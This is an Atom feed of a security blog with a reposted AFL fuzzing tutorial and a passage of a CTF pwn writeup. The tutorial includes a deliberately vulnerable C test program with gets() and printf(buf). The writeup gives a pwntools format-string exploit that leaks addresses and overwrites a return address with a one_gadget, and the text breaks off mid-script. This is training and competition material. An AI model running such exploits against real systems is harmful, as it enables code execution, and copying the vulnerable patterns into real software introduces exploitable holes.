<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2019-12-26T12:34:50.552Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AFL漏洞挖掘</title>
    <link href="https://nocbtm.github.io/2019/11/12/AFL%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://nocbtm.github.io/2019/11/12/AFL漏洞挖掘/</id>
    <published>2019-11-12T12:02:02.000Z</published>
    <updated>2019-12-26T12:34:50.552Z</updated>
    
    <content type="html"><![CDATA[<p>转载于 ：<a href="https://www.freebuf.com/articles/system/191543.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/191543.html</a></p><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一 前言"></a>一 前言</h2><p>模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/gpEyeKHY6JqSQPz.jpg" class="lozad"></p><h2 id="二-AFL简介"><a href="#二-AFL简介" class="headerlink" title="二 AFL简介"></a>二 AFL简介</h2><p>AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：</p><ul><li><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p></li><li><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p></li><li><p>③将队列中的文件按一定的策略进行“突变”；</p></li><li><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p></li><li><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p></li></ul><p><img alt="" data-src="https://i.loli.net/2019/11/17/26iNMIudQhyRXpG.jpg" class="lozad"></p><h2 id="三-选择和评估测试的目标"><a href="#三-选择和评估测试的目标" class="headerlink" title="三 选择和评估测试的目标"></a>三 选择和评估测试的目标</h2><p>开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（也可以Fuzzing一个网络程序）。</p><ol><li><p>用什么语言编写<br>AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等）</p></li><li><p>是否开源<br>AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。</p></li><li><p>程序版本<br>目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。</p></li><li><p>是否有示例程序、测试用例<br>如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。</p></li><li><p>项目规模<br>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。</p></li><li>程序曾出现过漏洞<br>如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。</li></ol><h2 id="四-构建语料库"><a href="#四-构建语料库" class="headerlink" title="四 构建语料库"></a>四 构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h3 id="1-选择"><a href="#1-选择" class="headerlink" title="1. 选择"></a>1. 选择</h3><p>(1) 有效的输入</p><p>尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</p><p>(2) 尽量小的体积</p><p>较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。</p><h3 id="2-寻找"><a href="#2-寻找" class="headerlink" title="2. 寻找"></a>2. 寻找</h3><p>使用项目自身提供的测试用例</p><p>目标程序bug提交页面</p><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p><p>afl源码的testcases目录下提供了一些测试用例</p><p>其他开源的语料库</p><h3 id="3-修剪"><a href="#3-修剪" class="headerlink" title="3. 修剪"></a>3. 修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。<br>(1) 移除执行相同代码的输入文件——afl-cmin</p><p>afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>(2) 减小单个输入文件的大小——afl-tmin<br>整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。</p><p>afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;s</span><br></pre></td></tr></table></figure><h2 id="五-构建被测试程序"><a href="#五-构建被测试程序" class="headerlink" title="五 构建被测试程序"></a>五 构建被测试程序</h2><p>前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别</p><h3 id="1-afl-gcc模式"><a href="#1-afl-gcc模式" class="headerlink" title="1. afl-gcc模式"></a>1. afl-gcc模式</h3><p>afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><p>在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><h3 id="2-LLVM模式"><a href="#2-LLVM模式" class="headerlink" title="2. LLVM模式"></a>2. LLVM模式</h3><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入llvm_mode目录进行编译，之后使用afl-clang-fast构建序程序即可，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> llvm_mode$ apt-get install clang$ <span class="built_in">export</span> LLVM_CONFIG=`<span class="built_in">which</span> llvm-config` &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> ..$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-clang-fast"</span> CXX=<span class="string">"afl-clang-fast++"</span></span><br></pre></td></tr></table></figure><p>在使用高版本的clang编译时可能会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。</p><h2 id="六-开始Fuzzing"><a href="#六-开始Fuzzing" class="headerlink" title="六 开始Fuzzing"></a>六 开始Fuzzing</h2><h3 id="1-白盒测试"><a href="#1-白盒测试" class="headerlink" title="1. 白盒测试"></a>1. 白盒测试</h3><h4 id="1-测试插桩程序"><a href="#1-测试插桩程序" class="headerlink" title="(1) 测试插桩程序"></a>(1) 测试插桩程序</h4><p>编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing <span class="string">'./build/bin/imagew'</span>...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples <span class="keyword">in</span> <span class="string">'/dev/null'</span>.</span><br></pre></td></tr></table></figure><p>使用不同的输入，正常情况下afl-showmap会捕获到不同的tuples，这就说明我们的的插桩是有效的，还有前面提到的afl-cmin就是通过这个工具来去掉重复的输入文件。</p><h4 id="2-执行fuzzer"><a href="#2-执行fuzzer" class="headerlink" title="(2) 执行fuzzer"></a>(2) 执行fuzzer</h4><p>在执行afl-fuzz前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改core_pattern文件，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>之后就可以执行afl-fuzz了，通常的格式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]</span><br></pre></td></tr></table></figure><p>或者使用“@@”替换输入文件，Fuzzer会将其替换为实际执行的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>如果没有什么错误，Fuzzer就正式开始工作了。首先，对输入队列中的文件进行预处理；然后给出对使用的语料库可警告信息，比如下图中提示有个较大的文件（14.1KB），且输入文件过多；最后，开始Fuzz主循环，显示状态窗口。</p><p>测试源代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>AFL状态窗口</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/tD5GNCSJ4nAxukH.png" class="lozad"></p><p>① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。</p><p>② Overall results：Fuzzer当前状态的概述。</p><p>③ Cycle progress：我们输入队列的距离。</p><p>④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。</p><p>⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。</p><p>⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。</p><p>⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。</p><p>⑧ Path geometry：有关Fuzzer找到的执行路径的信息。</p><p>⑨ CPU load：CPU利用率</p><h4 id="3-使用screen"><a href="#3-使用screen" class="headerlink" title="(3) 使用screen"></a>(3) 使用screen</h4><p>一次Fuzzing过程通常会持续很长时间，如果这期间运行afl-fuzz实例的终端终端被意外关闭了，那么Fuzzing也会被中断。而通过在screen session中启动每个实例，可以方便的连接和断开。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></p><p>也可以为每个session命名，方便重新连接。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S fuzzer1$ afl-fuzz -i testcase_dir -o findings_dir /path/to/program [params] @@[detached from 6999.fuzzer1]$ screen -r fuzzer1  ...</span><br></pre></td></tr></table></figure></p><h3 id="2-黑盒测试"><a href="#2-黑盒测试" class="headerlink" title="2. 黑盒测试"></a>2. 黑盒测试</h3><p>所谓黑盒测试，通俗地讲就是对没有源代码的程序进行测试，这时就要用到AFL的QEMU模式了。启用方式和LLVM模式类似，也要先编译。但注意，因为AFL使用的QEMU版本太旧，util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突，在这里可以找到针对QEMU的patch，之后运行脚本build_qemu_support.sh就可以自动下载编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev -y$ </span><br><span class="line">$ <span class="built_in">cd</span> qemu_mode$ build_qemu_support.sh$ <span class="built_in">cd</span> .. &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>现在起，只需添加-Q选项即可使用QEMU模式进行Fuzzing。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -Q -i testcase_dir -o findings_dir /path/to/program [params] @@</span><br></pre></td></tr></table></figure></p><h2 id="七-结束测试"><a href="#七-结束测试" class="headerlink" title="七 结束测试"></a>七 结束测试</h2><h3 id="1-何时结束"><a href="#1-何时结束" class="headerlink" title="1.何时结束"></a>1.何时结束</h3><p>检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。</p><p>（1）状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。</p><p>（2）距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。</p><p>（3）目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。</p><p>（4）上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。</p><h3 id="2-输出结果"><a href="#2-输出结果" class="headerlink" title="2. 输出结果"></a>2. 输出结果</h3><p>afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例：<br><img alt="" data-src="https://i.loli.net/2019/11/19/FNkeoOia15yUQXK.png" class="lozad"></p><p>queue：存放所有具有独特执行路径的测试用例。</p><p>crashes：导致目标接收致命signal而崩溃的独特测试用例。</p><p>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</p><p>hangs：导致目标超时的独特测试用例。</p><p>fuzzer_stats：afl-fuzz的运行状态。</p><p>plot_data：用于afl-plot绘图。</p><h2 id="八-处理测试结果"><a href="#八-处理测试结果" class="headerlink" title="八 处理测试结果"></a>八 处理测试结果</h2><p>到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;转载于 ：&lt;a href=&quot;https://www.freebuf.com/articles/system/191543.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/system
      
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>360杯 pwn writeup</title>
    <link href="https://nocbtm.github.io/2019/11/01/360%E6%9D%AF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2019/11/01/360杯-pwn-writeup/</id>
    <published>2019-11-01T07:54:33.000Z</published>
    <updated>2019-11-01T13:01:57.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串漏洞，但跟平时做的还不太一样，这题输入的数据存到了bss段，<br>任意地址写的时候，不能像平时那样直接写到栈上，解析栈上的数据，这里需要找一个合适的跳板，来修改函数返回地址。<br>当时没有做出来，看了360官方writeup之后，觉得利用的过程很巧妙，学到了一些新的姿势，对栈上的数据又有了更深刻的认识。</p><p><img alt="" data-src="https://raw.githubusercontent.com/https://github.com/nocbtm/picgo/master/img/20191101170357.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>泄露libc_addr,stack_addr</li><li>突破输入次数的限制，修改i的值</li><li>在跳板写上ret_addr所在的栈地址，再修改ret_addr为onegadget</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level   = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x3a80c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3a812</span>,<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HL</span><span class="params">(value)</span>:</span></span><br><span class="line"></span><br><span class="line">    lis = []</span><br><span class="line"></span><br><span class="line">    high = value &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    low = value &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">    lis.append(low)</span><br><span class="line"></span><br><span class="line">    lis.append(high)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lis</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"2. Exit"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"something"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"2. Exit"</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">## leak address</span></span><br><span class="line"></span><br><span class="line">input(<span class="string">"%5$p%12$p%15$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leaked = p.recvline()</span><br><span class="line"></span><br><span class="line">bin_base = int(leaked[<span class="number">2</span>:<span class="number">10</span>], <span class="number">16</span>) - <span class="number">0x1fb8</span></span><br><span class="line"></span><br><span class="line">stack_addr = int(leaked[<span class="number">12</span>:<span class="number">20</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">var_addr = stack_addr - <span class="number">0x2C</span> + <span class="number">0x3</span></span><br><span class="line"></span><br><span class="line">target_addr = stack_addr - <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">libc_base = int(leaked[<span class="number">22</span>:<span class="number">30</span>],<span class="number">16</span>) - <span class="number">247</span> - <span class="number">0x18540</span></span><br><span class="line"></span><br><span class="line">shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">bp = bin_base + <span class="number">0x81c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *' + str(hex(bp)))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"binary_base address is %x"</span> % bin_base)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"stack address is %x"</span> % stack_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"libc_base address is %x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"var address is %x"</span> % var_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"target address is %x"</span> % target_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Modify var i values</span></span><br><span class="line">lis = HL(var_addr)</span><br><span class="line"><span class="keyword">print</span> lis</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%21$hn"</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%255d%57$hhn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Write one_gadget at ret_addr through the target_addr</span></span><br><span class="line"></span><br><span class="line">lis = HL(target_addr)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + <span class="string">"c%21$hn"</span>)</span><br><span class="line"></span><br><span class="line">lis = HL(target_addr+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">input(<span class="string">"%"</span> + str(lis[<span class="number">0</span>])  + 